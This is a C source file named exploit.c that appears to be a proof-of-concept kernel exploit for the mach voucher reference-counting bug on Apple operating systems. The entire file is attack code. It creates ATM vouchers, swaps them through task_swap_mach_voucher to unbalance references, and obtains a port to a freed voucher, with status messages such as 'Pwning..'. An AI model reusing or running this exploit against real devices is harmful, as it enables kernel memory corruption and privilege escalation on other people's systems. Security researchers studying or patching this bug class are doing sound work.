//
//  exploit.c
//  mach_voucher
//
//  Created by yumiistar on 1/24/19.
//  Copyright Â© 2019 yumiistar. All rights reserved.
//

#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <mach/mach_error.h>

#include "exploit.h"

mach_port_t exploit(void) {
    // oof obv it's a kernel return not a int..
    mach_voucher_attr_recipe_data_t atm_data = {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = 510
    };
    
    kern_return_t err = KERN_FAILURE;
    
    printf("[INFO]: Pwning..\n");
    
    sleep(3);
    
    printf("[INFO]: Creating mach_voucher P1..\n");
    
    mach_port_t port1 = MACH_PORT_NULL;
    err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &port1);
    if (err != KERN_SUCCESS) {
        printf("[ERROR]: err = %d\n", err);
    }
    
    printf("OK: mach_voucher P1 = 0x%x\n", port1);
    
    sleep(0.5);
    
    printf("[INFO]: Creating mach_voucher P2..\n");
    
    mach_port_t port2 = MACH_PORT_NULL;
    err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &port2);
    if (err != KERN_SUCCESS) {
        printf("[ERROR]: err = %d\n", err);
    }
    
    printf("OK: mach_voucher P2 = 0x%x\n", port2);
    
    sleep(0.5);
    
    printf("[INFO]: Creating mach_voucher P3..\n");
    
    mach_port_t port3 = MACH_PORT_NULL;
    err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &port3);
    if (err != KERN_SUCCESS) {
        printf("[ERROR]: err = %d\n", err);
    }
    
    printf("OK: mach_voucher P3 = 0x%x\n", port3);
    
    sleep(0.5);
    
    printf("[INFO]: Creating mach_voucher P4..\n");
    
    mach_port_t port4 = MACH_PORT_NULL;
    err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &port4);
    if (err != KERN_SUCCESS) {
        printf("[ERROR]: err = %d\n", err);
    }
    
    printf("OK: mach_voucher P4 = 0x%x\n", port4);
    
    sleep(0.5);
    
    printf("[INFO]: Thread set mach voucher..\n");
    
    err = thread_set_mach_voucher(mach_thread_self(), port1);
    if (err != KERN_SUCCESS) {
        printf("[ERROR]: err = %d\n", err);
    }
    
    printf("OK: Thread set mach voucher\n");
    
    sleep(0.5);
    
    printf("[INFO]: Task swap mach voucher P1 - P2..\n");
    
    err = task_swap_mach_voucher(mach_task_self(), port1, &port2);
    if (err != KERN_SUCCESS) {
        printf("[ERROR]: err = %d\n", err);
    }
    
    printf("OK: Task swap mach voucher P1 - P2 = 0x%x\n", port2);
    
    sleep(0.5);
    
    printf("[INFO]: Task swap mach voucher P1 - P3..\n");
    
    err = task_swap_mach_voucher(mach_task_self(), port1, &port3);
    if (err != KERN_SUCCESS) {
        printf("[ERROR]: err = %d\n", err);
    }
    
    printf("OK: Task swap mach voucher P1 - P3 = 0x%x\n", port3);
    
    sleep(1);
    
    printf("[INFO]: Getting pointer..\n");
    
    mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;
    err = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);
    
    printf("OK: real port to fake voucher = 0x%x\n", real_port_to_fake_voucher);
    
    return real_port_to_fake_voucher;
}

